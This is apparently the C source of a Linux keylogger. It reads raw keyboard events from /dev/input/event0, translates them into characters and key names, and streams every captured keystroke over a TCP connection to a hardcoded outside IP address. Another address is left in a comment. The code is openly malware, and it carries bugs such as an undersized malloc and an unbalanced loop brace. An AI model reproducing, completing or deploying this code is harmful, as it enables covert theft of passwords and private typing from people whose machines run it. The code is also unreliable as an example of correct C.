#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdlib.h>

#define LOGFILE "tmp/data"

int main(int argc, char* argv[]) {

//connect
printf("Establshing connection...\n");
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
//Bind the socket
struct sockaddr_in *addr;

addr = (struct sockaddr_in*) malloc(sizeof(addr));
addr->sin_family = AF_INET;
addr->sin_port = htons(atoi(argv[1]));
addr->sin_addr.s_addr = inet_addr("54.215.252.14"); //71.198.217.231"


if(connect(sockfd, (struct sockaddr*) addr, sizeof(*addr)) <= -1){
	printf("Error in connecting \n");
	perror("error");
	return 1;
}


  printf("Starting keylogger\n");
  struct input_event ev;
  int fd = open("/dev/input/event0", O_RDONLY);
  FILE *fp = fopen(LOGFILE, "w");
  FILE *buffout = fopen(LOGFILE, "r");
  if(buffout == NULL){
    printf("Error with buffout\n");
  }
  char *char_map = "..1234567890-=..qwertyuiop{}\n.asdfghjkl;'...zxcvbnm,./";
  int newline_check = 1;
  char buff[32];
  int length = 0;
  while (1) {
    int bytes_read = read(fd, &ev, sizeof(ev));
    if (bytes_read > 0 && ev.type == EV_KEY) {
      //	printf("Keystroke: %c\n",char_map[ev.code]);
	
      if (ev.value == 1) {
        switch (ev.code) {
        case 1:
          length = sprintf(buff, "ESC");
          break;
        case 14:
          length = sprintf(buff, "BSP");
          break;
        case 15:
          length = sprintf(buff, "	");
          break;
        case 29:
          length = sprintf(buff, "LFT_CNTRL_DWN");
          break;
        case 42:
          length = sprintf(buff, "LFT_SHFT_DWN");
          break;
        case 43:
          length = sprintf(buff, "\\");
          break;
        case 54:
          length = sprintf(buff, "RHT_SHFT_DWN");
          break;
        case 56:
          length = sprintf(buff, "LFT_ALT_DWN");
          break;
        case 58:
          length = sprintf(buff, "CPS_LCK");
          break;
        case 57:
          length = sprintf(buff, " ");
          break;
        default:
          length = sprintf(buff, "%c", char_map[ev.code]);
          break;
        }
      }

      else if (ev.value == 0) {
        switch (ev.code) {
        case 29:
          length = sprintf(buff, "LFT_CNTRL_UP");
          break;
        case 42:
          length = sprintf(buff, "LFT_SHFT_UP");
          break;
        case 54:
          length = sprintf(buff, "RHT_SHFT_UP");
          break;
        case 56:
          length = sprintf(buff, "LFT_ALT_UP");
          break;
        case 58:
          length = sprintf(buff, "CPS_LCK");
          break;
	 default:
	  newline_check = 0;
        	break;
	}
      }
      buff[length] = '\n';
      if(newline_check == 1){
          write(sockfd, &buff, length + 1);
	     }
      newline_check = 1;
    }


    /*if(bytes_read < 0){
            printf("error: %d %d\n", errno, bytes_read);
    {*/
  fclose(fp); 
  fclose(buffout);
  close(fd);
  return 0;
}
